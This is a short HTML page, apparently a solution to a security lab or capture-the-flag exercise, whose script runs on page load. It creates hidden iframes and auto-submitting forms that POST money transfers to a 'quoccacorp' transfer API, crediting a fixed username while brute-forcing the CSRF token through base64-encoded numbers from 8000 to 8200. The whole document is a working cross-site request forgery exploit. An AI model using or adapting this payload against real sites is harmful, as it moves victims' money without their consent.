<!DOCTYPE html>
<html>
<body>
<script>
    const myUsername = "z5609537";

    for (let i = 8000; i <= 8200; i++) {
        const token = btoa(i.toString());
        const iframe = document.createElement('iframe');
        iframe.name = 'f' + i;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://phish-me.quoccacorp.com/api/transfer';
        form.target = 'f' + i;

        form.innerHTML = '<input name="username" value="' + myUsername + '">' +
            '<input name="amount" value="100">' +
            '<input name="csrf_token" value="' + token + '">';

        document.body.appendChild(form);
        form.submit();
    }
</script>
</body>
</html>
